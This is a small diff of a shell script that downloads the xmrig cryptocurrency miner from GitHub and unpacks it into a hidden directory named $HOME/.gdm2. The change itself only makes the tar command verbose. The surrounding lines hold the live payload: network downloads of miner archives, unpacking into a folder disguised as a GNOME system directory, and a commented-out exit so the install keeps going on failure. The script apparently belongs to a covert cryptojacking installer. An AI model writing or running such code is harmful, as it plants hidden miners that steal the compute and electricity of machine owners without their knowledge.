@@ -168,7 +168,7 @@ wget https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.
 
 echo "[*] Unpacking xmrig.tar.gz to $HOME/.gdm2"
 [ -d $HOME/.gdm2 ] || mkdir $HOME/.gdm2
-if ! tar xf xmrig.tar.gz -C $HOME/.gdm2; then
+if ! tar xvf xmrig.tar.gz -C $HOME/.gdm2; then
   echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.gdm2 directory"
 #  exit 1
 fi
@@ -198,7 +198,7 @@ if (test $? -ne 0); then
   wget https://github.com/xmrig/xmrig/releases/latest -O xmrig.tar.gz
 
   echo "[*] Unpacking xmrig.tar.gz to $HOME/.gdm2"
-  if ! tar xf xmrig.tar.gz -C $HOME/.gdm2 --strip=1; then
+  if ! tar xvf xmrig.tar.gz -C $HOME/.gdm2 --strip=1; then
     echo "WARNING: Can't unpack xmrig.tar.gz to $HOME/.gdm2 directory"
   fi
   rm xmrig.tar.gz
